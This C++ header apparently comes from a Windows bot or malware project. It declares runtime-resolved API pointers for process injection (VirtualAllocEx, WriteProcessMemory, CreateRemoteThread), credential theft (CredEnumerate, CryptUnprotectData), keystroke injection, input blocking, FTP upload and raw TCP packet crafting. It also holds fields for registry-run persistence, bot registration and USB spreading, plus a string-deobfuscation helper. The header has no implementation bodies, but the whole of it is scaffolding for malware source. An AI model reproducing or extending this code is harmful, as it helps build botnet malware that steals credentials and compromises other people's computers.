#ifndef API_HPP
#define API_HPP
#define IP_HDRINCL  2 
#define URG 0x20
#define ACK 0x10
#define PSH 0x08
#define RST 0x04
#define SYN 0x02
#define FIN 0x01

#include "../Includes/includes.hpp"

class API {
public:
	API		( void );
	~API	( void );

	typedef struct _WIN32_FIND_DATA {
	  DWORD    dwFileAttributes;
	  FILETIME ftCreationTime;
	  FILETIME ftLastAccessTime;
	  FILETIME ftLastWriteTime;
	  DWORD    nFileSizeHigh;
	  DWORD    nFileSizeLow;
	  DWORD    dwReserved0;
	  DWORD    dwReserved1;
	  TCHAR    cFileName[MAX_PATH];
	  TCHAR    cAlternateFileName[14];
	} WIN32_FIND_DATA, WIN32_FIND_DATAA, *PWIN32_FIND_DATA, *LPWIN32_FIND_DATA;

	typedef struct tcphdr {
		unsigned short sport;			
		unsigned short dport;			
		unsigned int   seq;				
		unsigned int   ack_seq;		
		unsigned char  lenres;			
		unsigned char  flags;			
		unsigned short window;			
		unsigned short checksum;		
		unsigned short urg_ptr;			

	} TCPHEADER;

	typedef struct tcphdr2 {

		unsigned short source;			
		unsigned short dest;			
		unsigned int   seq;				
		unsigned int   ack_seq;			
		unsigned short res1;
		unsigned short doff;
		unsigned short fin;
		unsigned short syn;
		unsigned short rst;
		unsigned short psh;
		unsigned short ack;
		unsigned short urg;
		unsigned short res2;
		unsigned short window;			
		unsigned short check;		
		unsigned short urg_ptr;		

	} TCPHEADER2;

	typedef struct iphdr {

		unsigned char  verlen;			
		unsigned char  tos;				
		unsigned short total_len;		
		unsigned short ident;			
		unsigned short frag_and_flags;	
		unsigned char  ttl;				
		unsigned char  proto;			
		unsigned short checksum;	
		unsigned int   sourceIP;		
		unsigned int   destIP;		

	} IPHEADER;

	typedef struct pshdr {

		unsigned int   saddr;		
		unsigned int   daddr;		
		unsigned char  zero;			
		unsigned char  proto;		
		unsigned short length;		
		struct tcphdr tcp;				

	} PSDHEADER;

	typedef struct tagPROCESSENTRY32 {
		DWORD dwSize;
		DWORD cntUsage;
		DWORD th32ProcessID;
		ULONG_PTR th32DefaultHeapID;
		DWORD th32ModuleID;
		DWORD cntThreads;
		DWORD th32ParentProcessID;
		LONG pcPriClassBase;
		DWORD dwFlags;
		TCHAR szExeFile[MAX_PATH];
	} PROCESSENTRY32, *PPROCESSENTRY32;

	typedef struct tagTHREADENTRY32 {
		DWORD dwSize;
		DWORD cntUsage;
		DWORD th32ThreadID;
		DWORD th32OwnerProcessID;
		LONG  tpBasePri;
		LONG  tpDeltaPri;
		DWORD dwFlags;
	} THREADENTRY32, *PTHREADENTRY32;

	typedef struct _DEV_BROADCAST_DEVICEINTERFACE {
		DWORD dbcc_size;
		DWORD dbcc_devicetype;
		DWORD dbcc_reserved;
		GUID  dbcc_classguid;
		TCHAR dbcc_name[1];
	} DEV_BROADCAST_DEVICEINTERFACE, *PDEV_BROADCAST_DEVICEINTERFACE;

	typedef struct _DEV_BROADCAST_HDR {
		DWORD dbch_size;
		DWORD dbch_devicetype;
		DWORD dbch_reserved;
	} DEV_BROADCAST_HDR, *PDEV_BROADCAST_HDR;

	typedef struct _DEV_BROADCAST_VOLUME {
		DWORD dbcv_size;
		DWORD dbcv_devicetype;
		DWORD dbcv_reserved;
		DWORD dbcv_unitmask;
		WORD  dbcv_flags;
	} DEV_BROADCAST_VOLUME, *PDEV_BROADCAST_VOLUME;

	typedef union _LARGE_INTEGER {
		struct {
			DWORD LowPart;
			LONG  HighPart;
		};
		struct {
			DWORD LowPart;
			LONG  HighPart;
		} u;
		LONGLONG QuadPart;
	} LARGE_INTEGER, *PLARGE_INTEGER;

	typedef PROCESSENTRY32 * LPPROCESSENTRY32;
	typedef THREADENTRY32 * LPTHREADENTRY32;

	char*	lstrtok				( char *s, const char *delim );
	char*	lstrtok_r			( char *s, const char *delim, char **last );
	//void	lsprintf			( char *dest, const char *format, ... );
	int		intlen				( float start );
	//string	magic				( string const& s );
	string	magic				( const char* );
	bool	fileExists			( string );
	string	GetUserAgent		( void );
	string	GenFileName			( unsigned int );
	DWORD	GetFileSize			( string );
	USHORT checksum				(USHORT *buffer, int size);

	//Kernel
	typedef LPTSTR		(__stdcall *zLstrcpy)						( LPTSTR lpString1, LPTSTR lpString2);	
	typedef int			(__stdcall *zLstrlen)						( LPCTSTR lpString);
	typedef int			(__stdcall *zLstrcmp)						( LPCTSTR lpString1, LPCTSTR lpString2);
	typedef LPTSTR		(__stdcall *zLstrcat)						( LPTSTR lpString1, LPTSTR lpString2 );
	typedef void		(__stdcall *zSleep)							( DWORD dwMilliseconds);
	typedef HANDLE		(__stdcall *zCreateThread)					( LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
	typedef int			(__stdcall *zGetLocaleInfo)					( LCID Locale, LCTYPE LCType, LPTSTR lpLCData, int cchData);
	typedef DWORD		(__stdcall *zGetTickCount)					( void );
	typedef HANDLE		(__stdcall *zCreateMutex)					( LPSECURITY_ATTRIBUTES lpMutexAttributes, BOOL bInitialOwner, LPCTSTR lpName);
	typedef DWORD		(__stdcall *zGetLastError)					( void );
	typedef HMODULE		(__stdcall *zGetModuleHandle)				( LPCTSTR lpModuleName);
	typedef BOOL		(__stdcall *zCloseHandle)					( HANDLE hObject);
	typedef HANDLE		(__stdcall *zCreateFile)					( LPCTSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
	typedef BOOL		(__stdcall *zWriteFile)						( HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped);
	typedef DWORD		(__stdcall *zGetFileAttributes)				( LPCTSTR lpFileName);
	typedef DWORD		(__stdcall *zExpandEnvironmentStrings)		( LPCTSTR lpSrc, LPTSTR lpDst, DWORD nSize);
	typedef HMODULE		(__stdcall *zGetModuleHandle)				( LPCTSTR lpModuleName);
	typedef DWORD		(__stdcall *zGetModuleFileName)				( HMODULE hModule, LPTSTR lpFilename, DWORD nSize);
	typedef BOOL		(__stdcall *zCopyFile)						( LPCTSTR lpExistingFileName, LPCTSTR lpNewFileName, BOOL bFailIfExists);
	typedef BOOL		(__stdcall *zSetFileAttributes)				( LPCTSTR lpFileName, DWORD dwFileAttributes);
	typedef	UINT		(__stdcall *zGetDriveType)					( LPCTSTR lpRootPathName);
	typedef BOOL		(__stdcall *zDeleteFile)					( LPCTSTR lpFileName);
	typedef HANDLE		(__stdcall *zCreateToolhelp32Snapshot)		( DWORD dwFlags, DWORD th32ProcessID);
	typedef BOOL		(__stdcall *zProcess32First)				( HANDLE hSnapshot, LPPROCESSENTRY32 lppe);
	typedef BOOL		(__stdcall *zProcess32Next)					( HANDLE hSnapshot, LPPROCESSENTRY32 lppe);
	typedef HANDLE		(__stdcall *zOpenProcess)					( DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId);
	typedef LPVOID		(__stdcall *zVirtualAllocEx)				( HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
	typedef BOOL		(__stdcall *zWriteProcessMemory)			( HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesWritten);
	typedef HANDLE		(__stdcall *zCreateRemoteThread)			( HANDLE hProcess, LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
	typedef HANDLE		(__stdcall *zGetCurrentProcess)				( void );
	typedef BOOL		(__stdcall *zTerminateThread)				( HANDLE hThread, DWORD dwExitCode);
	typedef BOOL		(__stdcall *zGetFileSizeEx)					( HANDLE hFile, PLARGE_INTEGER lpFileSize);
	typedef	HMODULE		(__stdcall *zLoadLibrary)					( LPCTSTR lpFileName );
	typedef FARPROC		(__stdcall *zGetProcAddress)				( HMODULE hModule, LPCSTR lpProcName );
	typedef BOOL		(__stdcall *zVirtualProtect)				( LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
	typedef BOOL		(__stdcall *zVirtualProtectEx)				( HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
	typedef HANDLE		(__stdcall *zFindFirstFile)					( LPCTSTR lpFileName, LPWIN32_FIND_DATA lpFindFileData );
	typedef	BOOL		(__stdcall *zFindNextFile)					( HANDLE hFindFile, LPWIN32_FIND_DATA lpFindFileData );
	typedef BOOL		(__stdcall *zFindClose)						( HANDLE hFindFile );
	typedef DWORD		(__stdcall *zGetLogicalDriveStrings)		( DWORD nBufferLength, LPTSTR lpBuffer);
	typedef HLOCAL		(__stdcall *zLocalFree)						( HLOCAL hMem );
	typedef BOOL		(__stdcall *zReadFile)						( HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead, LPDWORD lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped );
	typedef BOOL		(__stdcall *zCreateProcess)					( LPCTSTR lpApplicationName, LPTSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCTSTR lpCurrentDirectory, LPSTARTUPINFO lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation );
	typedef BOOL		(__stdcall *zTerminateProcess)				( HANDLE hProcess, UINT uExitCode );
	typedef DWORD		(__stdcall *zGetModuleFileNameEx)			( HANDLE hProcess, HMODULE hModule, LPTSTR lpFilename, DWORD nSize);
	typedef BOOL		(__stdcall *zThread32First)					( HANDLE hSnapshot, LPTHREADENTRY32 lpte);
	typedef BOOL		(__stdcall *zThread32Next)					( HANDLE hSnapshot, LPTHREADENTRY32 lpte);
	typedef HANDLE		(__stdcall *zOpenThread)					( DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwThreadId);
	typedef	DWORD		(__stdcall *zResumeThread)					( HANDLE hThread );
	typedef DWORD		(__stdcall *zSuspendThread)					( HANDLE hThread );

	//Advapi
	typedef LONG		(__stdcall *zRegQueryValueEx)				( HKEY hKey, LPCTSTR lpValueName, LPDWORD lpReserved, LPDWORD lpType, LPBYTE lpData, LPDWORD lpcbData);
	typedef LONG		(__stdcall *zRegOpenKeyEx)					( HKEY hKey, LPCTSTR lpSubKey, DWORD ulOptions, REGSAM samDesired, PHKEY phkResult);
	typedef LONG		(__stdcall *zRegCreateKey)					( HKEY hKey, LPCTSTR lpSubKey, PHKEY phkResult);
	typedef LONG		(__stdcall *zRegDeleteKey)					( HKEY hKey, LPCTSTR lpSubKey);
	typedef LONG		(__stdcall *zRegSetValueEx)					( HKEY hKey, LPCTSTR lpValueName, DWORD Reserved, DWORD dwType, const BYTE *lpData, DWORD cbData);
	typedef LONG		(__stdcall *zRegCloseKey)					( HKEY hKey);
	typedef LONG		(__stdcall *zRegDeleteValue)				( HKEY hKey, LPCTSTR lpValueName);
	typedef BOOL		(__stdcall *zOpenProcessToken)				( HANDLE ProcessHandle, DWORD DesiredAccess, PHANDLE TokenHandle);
	typedef BOOL		(__stdcall *zLookupPrivilegeValue)			( LPCTSTR lpSystemName, LPCTSTR lpName, PLUID lpLuid);
	typedef BOOL		(__stdcall *zAdjustTokenPrivileges)			( HANDLE TokenHandle, BOOL DisableAllPrivileges, PTOKEN_PRIVILEGES NewState, DWORD BufferLength, PTOKEN_PRIVILEGES PreviousState, PDWORD ReturnLength);
	typedef BOOL		(__stdcall *zCredEnumerate)					( LPCTSTR Filter, DWORD Flags, DWORD *Count, PCREDENTIAL **Credentials );
	typedef VOID		(__stdcall *zCredFree)						( PVOID Buffer );
	typedef LONG		(__stdcall *zRegEnumValue)					( HKEY hKey, DWORD dwIndex, LPTSTR lpValueName, LPDWORD lpcchValueName, LPDWORD lpReserved, LPDWORD lpType, LPBYTE lpData, LPDWORD lpcbData );
	typedef BOOL		(__stdcall *zCryptAcquireContext)			( HCRYPTPROV *phProv, LPCTSTR pszContainer, LPCTSTR pszProvider, DWORD dwProvType, DWORD dwFlags );
	typedef BOOL		(__stdcall *zCryptHashData)					( HCRYPTHASH hHash, BYTE *pbData, DWORD dwDataLen, DWORD dwFlags );
	typedef BOOL		(__stdcall *zCryptGetHashParam)				( HCRYPTHASH hHash, DWORD dwParam, BYTE *pbData, DWORD *pdwDataLen, DWORD dwFlags );
	typedef BOOL		(__stdcall *zCryptDestroyHash)				( HCRYPTHASH hHash );
	typedef BOOL		(__stdcall *zCryptReleaseContext)			( HCRYPTPROV hProv, DWORD dwFlags );
	typedef BOOL		(__stdcall *zCryptCreateHash)				( HCRYPTPROV hProv, ALG_ID Algid, HCRYPTKEY hKey, DWORD dwFlags, HCRYPTHASH *phHash );

	//Winsock
	typedef int				(*zWSACleanup)							( void );
	typedef int				(WSAAPI *zWSAStartup)					( WORD wVersionRequested, LPWSADATA lpWSAData);
	typedef int				(__stdcall *zgetaddrinfo)				( PCSTR pNodeName, PCSTR pServiceName, const ADDRINFOA *pHints, PADDRINFOA *ppResult);
	typedef SOCKET			(WSAAPI *zsocket)						( int af, int type, int protocol);
	typedef int				(__stdcall *zsend)						( SOCKET s, const char *buf, int len, int flags);
	typedef int				(__stdcall *zrecv)						( SOCKET s, char *buf, int len, int flags);
	typedef int				(__stdcall *zconnect)					( SOCKET s, const struct sockaddr *name, int namelen);
	typedef int				(__stdcall *zclosesocket)				( SOCKET s);
	typedef unsigned long	(__stdcall *zinet_addr)					( const char *cp);
	typedef	u_long			(WSAAPI	*zhtonl)						( u_long hostlong);
	typedef	u_short			(WSAAPI *zhtons)						( u_short hostshort);
	typedef	SOCKET			(__stdcall *zWSASocket)					( int af, int type, int protocol, LPWSAPROTOCOL_INFO lpProtocolInfo, GROUP g, DWORD dwFlags);
	typedef int				(__stdcall *zsetsockopt)				( SOCKET s, int level, int optname, const char *optval, int optlen);
	typedef int				(__stdcall *zsendto)					( SOCKET s, const char *buf, int len, int flags, const struct sockaddr *to, int tolen);
	typedef char*			(FAR *zinet_ntoa)						( struct   in_addr in);
	typedef int				(__stdcall *zioctlsocket)				( SOCKET s, long cmd, u_long *argp );

	//WinInet
	typedef	HINTERNET		(__stdcall *zInternetOpen)				( LPCTSTR lpszAgent, DWORD dwAccessType, LPCTSTR lpszProxyName, LPCTSTR lpszProxyBypass, DWORD dwFlags);
	typedef HINTERNET		(__stdcall *zInternetOpenUrl)			( HINTERNET hInternet, LPCTSTR lpszUrl, LPCTSTR lpszHeaders, DWORD dwHeadersLength, DWORD dwFlags, DWORD_PTR dwContext);
	typedef BOOL			(__stdcall *zInternetReadFile)			( HINTERNET hFile, LPVOID lpBuffer, DWORD dwNumberOfBytesToRead, LPDWORD lpdwNumberOfBytesRead);
	typedef BOOL			(__stdcall *zInternetCloseHandle)		( HINTERNET hInternet);
	typedef HINTERNET		(__stdcall *zInternetConnect)			( HINTERNET hInternet, LPCTSTR lpszServerName, INTERNET_PORT nServerPort, LPCTSTR lpszUsername, LPCTSTR lpszPassword, DWORD dwService, DWORD dwFlags, DWORD_PTR dwContext );
	typedef BOOL			(__stdcall *zFtpPutFile)				( HINTERNET hConnect, LPCTSTR lpszLocalFile, LPCTSTR lpszNewRemoteFile, DWORD dwFlags, DWORD_PTR dwContext );
	
	//Urlmon
	typedef HRESULT		(__stdcall *zObtainUserAgentString)			( DWORD dwOption, LPCSTR *pcszUAOut, DWORD *cbSize);

	//Shell32
	typedef HINSTANCE	(__stdcall *zShellExecute)					( HWND hwnd, LPCTSTR lpOperation, LPCTSTR lpFile, LPCTSTR lpParameters, LPCTSTR lpDirectory, INT nShowCmd);

	//User32
	typedef HDEVNOTIFY	(__stdcall *zRegisterDeviceNotification)	( HANDLE hRecipient, LPVOID NotificationFilter, DWORD Flags);
	typedef HWND		(__stdcall *zCreateWindowEx)				( DWORD dwExStyle, LPCTSTR lpClassName, LPCTSTR lpWindowName, DWORD dwStyle, int x, int y, int nWidth, int nHeight, HWND hWndParent, HMENU hMenu, HINSTANCE hInstance, LPVOID lpParam);
	typedef ATOM		(__stdcall *zRegisterClassEx)				( const WNDCLASSEX *lpwcx);
	typedef LRESULT		(__stdcall *zDefWindowProc)					( HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam);
	typedef BOOL		(__stdcall *zGetMessage)					( LPMSG lpMsg, HWND hWnd, UINT wMsgFilterMin, UINT wMsgFilterMax);
	typedef BOOL		(__stdcall *zTranslateMessage)				( const MSG *lpMsg);
	typedef LRESULT		(__stdcall *zDispatchMessage)				( const MSG *lpmsg);
	typedef BOOL		(__stdcall *zPeekMessage)					( LPMSG lpMsg, HWND hWnd, UINT wMsgFilterMin, UINT wMsgFilterMax, UINT wRemoveMsg);
	typedef int			(__stdcall *zMessageBox)					( HWND hWnd, LPCTSTR lpText, LPCTSTR lpCaption, UINT uType);
	typedef int			(__cdecl   *zwsprintf)						( LPTSTR lpOut, LPCTSTR lpFmt, ...);
	typedef HANDLE		(__stdcall *zSetClipboardData)				( UINT uFormat, HANDLE hMem );
	typedef BOOL		(__stdcall *zOpenClipboard)					( HWND hWndNewOwner );
	typedef BOOL		(__stdcall *zEmptyClipboard)				( void );
	typedef BOOL		(__stdcall *zCloseClipboard)				( void );
	typedef BOOL		(__stdcall *zSetForegroundWindow)			( HWND hWnd );
	typedef HWND		(__stdcall *zSetFocus)						( HWND hWnd );
	typedef BOOL		(__stdcall *zShowWindow)					( HWND hWnd, int nCmdShow );
	typedef VOID		(__stdcall *zkeybd_event)					( BYTE bVk, BYTE bScan, DWORD dwFlags, ULONG_PTR dwExtraInfo );
	typedef BOOL		(__stdcall *zBlockInput)					( BOOL fBlockIt );
	typedef SHORT		(__stdcall *zVkKeyScan)						( TCHAR ch );

	//PDH
	typedef PDH_STATUS	(__stdcall *zPdhAddCounter)					( PDH_HQUERY hQuery, LPCTSTR szFullCounterPath, DWORD_PTR dwUserData, PDH_HCOUNTER *phCounter);
	typedef PDH_STATUS	(__stdcall *zPdhCollectQueryData)			( PDH_HQUERY hQuery);
	typedef PDH_STATUS	(__stdcall *zPdhGetFormattedCounterValue)	( PDH_HCOUNTER hCounter, DWORD dwFormat, LPDWORD lpdwType, PPDH_FMT_COUNTERVALUE pValue);
	typedef	PDH_STATUS	(__stdcall *zPdhOpenQuery)					( LPCTSTR szDataSource, DWORD_PTR dwUserData, PDH_HQUERY *phQuery);
	
	//Ole32
	typedef HRESULT		(__stdcall *zCoInitialize)					( LPVOID pvReserved );
	typedef HRESULT		(__stdcall *zCoCreateInstance)				( REFCLSID rclsid, LPUNKNOWN pUnkOuter, DWORD dwClsContext, REFIID riid, LPVOID *ppv );
	typedef void		(__stdcall *zCoUninitialize)				( void );

	//Crypt32
	typedef BOOL		(__stdcall *zCryptUnprotectData)			( DATA_BLOB *pDataIn, LPWSTR *ppszDataDescr, DATA_BLOB *pOptionalEntropy, PVOID pvReserved, CRYPTPROTECT_PROMPTSTRUCT *pPromptStruct, DWORD dwFlags, DATA_BLOB *pDataOut );
	
	//OleAut32
	typedef VOID		(__stdcall *zVariantInit)					( VARIANTARG *pvarg );
	
	//Shlwapi
	typedef BOOL		(__stdcall *zPathRemoveFileSpec)			( LPTSTR pszPath );


	//Kernel
	zLstrcpy					lstrcpy;
	zLstrlen					lstrlen;
	zLstrcmp					lstrcmp;
	zLstrcat					lstrcat;
	zSleep						Sleep;
	zGetLocaleInfo				GetLocaleInfo;
	zCreateThread				CreateThread;
	zGetTickCount				GetTickCount;
	zCreateMutex				CreateMutex;
	zGetLastError				GetLastError;
	zGetModuleHandle			GetModuleHandle;
	zCloseHandle				CloseHandle;
	zCreateFile					CreateFile;
	zWriteFile					WriteFile;
	zGetFileAttributes			GetFileAttributes;
	zExpandEnvironmentStrings	ExpandEnvironmentStrings;
	zGetModuleFileName			GetModuleFileName;
	zCopyFile					CopyFile;
	zSetFileAttributes			SetFileAttributes;
	zGetDriveType				GetDriveType;
	zDeleteFile					DeleteFile;
	zCreateToolhelp32Snapshot	CreateToolhelp32Snapshot;
	zProcess32First				Process32First;
	zProcess32Next				Process32Next;
	zOpenProcess				OpenProcess;
	zVirtualAllocEx				VirtualAllocEx;
	zWriteProcessMemory			WriteProcessMemory;
	zCreateRemoteThread			CreateRemoteThread;
	zGetCurrentProcess			GetCurrentProcess;
	zTerminateThread			TerminateThread;
	zGetFileSizeEx				GetFileSizeEx;
	zLoadLibrary				zzLoadLibrary;
	zGetProcAddress				zzGetProcAddress;
	zVirtualProtect				VirtualProtect;
	zVirtualProtectEx			VirtualProtectEx;
	zFindFirstFile				FindFirstFile;
	zFindNextFile				FindNextFile;
	zFindClose					FindClose;
	zGetLogicalDriveStrings		GetLogicalDriveStringsA;
	zLocalFree					LocalFree;
	zReadFile					ReadFile;
	zCreateProcess				CreateProcess;
	zTerminateProcess			TerminateProcess;
	zGetModuleFileNameEx		GetModuleFileNameEx;
	zThread32First				Thread32First;
	zThread32Next				Thread32Next;
	zOpenThread					OpenThread;
	zResumeThread				ResumeThread;
	zSuspendThread				SuspendThread;

	//Advapi
	zRegQueryValueEx			RegQueryValueEx;
	zRegOpenKeyEx				RegOpenKeyEx;
	zRegCreateKey				RegCreateKey;
	zRegDeleteKey				RegDeleteKey;
	zRegSetValueEx				RegSetValueEx;
	zRegCloseKey				RegCloseKey;
	zRegDeleteValue				RegDeleteValue;
	zOpenProcessToken			OpenProcessToken;
	zLookupPrivilegeValue		LookupPrivilegeValue;
	zAdjustTokenPrivileges		AdjustTokenPrivileges;
	zCredEnumerate				CredEnumerate;
	zCredFree					CredFree;
	zRegEnumValue				RegEnumValue;
	zCryptAcquireContext		CryptAcquireContext;
	zCryptHashData				CryptHashData;
	zCryptGetHashParam			CryptGetHashParam;
	zCryptDestroyHash			CryptDestroyHash;
	zCryptReleaseContext		CryptReleaseContext;
	zCryptCreateHash			CryptCreateHash;

	//Winsock
	zWSACleanup		WSACleanup;
	zWSAStartup		WSAStartup;
	zgetaddrinfo	getaddrinfo;
	zsocket			socket;
	zsend			send;
	zrecv			recv;
	zconnect		connect;
	zclosesocket	closesocket;
	zinet_addr		inet_addr;
	zhtonl			htonl;
	zhtons			htons;
	zWSASocket		WSASocket;
	zsetsockopt		setsockopt;
	zsendto			sendto;
	zinet_ntoa		inet_ntoa;
	zioctlsocket	ioctlsocket;

	//WinInet
	zInternetOpen			InternetOpen;
	zInternetOpenUrl		InternetOpenUrl;
	zInternetReadFile		InternetReadFile;
	zInternetCloseHandle	InternetCloseHandle;
	zInternetConnect		InternetConnect;
	zFtpPutFile				FtpPutFile;

	//URLMon
	zObtainUserAgentString	ObtainUserAgentString;

	//Shell32
	zShellExecute			ShellExecuteA;

	//User32
	zRegisterDeviceNotification		RegisterDeviceNotification;
	zCreateWindowEx					CreateWindowEx;
	zRegisterClassEx				RegisterClassEx;
	zDefWindowProc					DefWindowProc;
	zGetMessage						GetMessage;
	zTranslateMessage				TranslateMessage;
	zDispatchMessage				DispatchMessage;
	zPeekMessage					PeekMessage;
	zMessageBox						MessageBox;
	zwsprintf						wsprintf;
	zSetClipboardData				SetClipboardData;
	zOpenClipboard					OpenClipboard;
	zEmptyClipboard					EmptyClipboard;
	zCloseClipboard					CloseClipboard;
	zSetForegroundWindow			SetForegroundWindow;
	zSetFocus						SetFocus;
	zShowWindow						ShowWindow;
	zkeybd_event					keybd_event;
	zBlockInput						BlockInput;
	zVkKeyScan						VkKeyScan;

	//PDH
	zPdhAddCounter					PdhAddCounter;
	zPdhCollectQueryData			PdhCollectQueryData;
	zPdhGetFormattedCounterValue	PdhGetFormattedCounterValue;
	zPdhOpenQuery					PdhOpenQuery;

	//Ole32
	zCoInitialize					CoInitialize;
	zCoCreateInstance				CoCreateInstance;
	zCoUninitialize					CoUninitialize;
	
	//Crypt32
	zCryptUnprotectData				CryptUnprotectData;
	
	//oleaut32
	zVariantInit					VariantInit;

	//Shlwapi
	zPathRemoveFileSpec				PathRemoveFileSpec;

	HMODULE hShell, hWsock, hAdvapi, hKernel, hInet, hUrl, hUser32, hPdh, hOle32, hCrypt32, hOleAut32, hPsApi, hShlwapi;
	HINTERNET hIneth;

	string	directory;
	string	exefile;
	string	final;
	string	thisfile;
	string	thismd5;		
	string  regrunkey;

	DWORD beginning;
	bool persist;
	bool newBot;
	bool usb;
};

#endif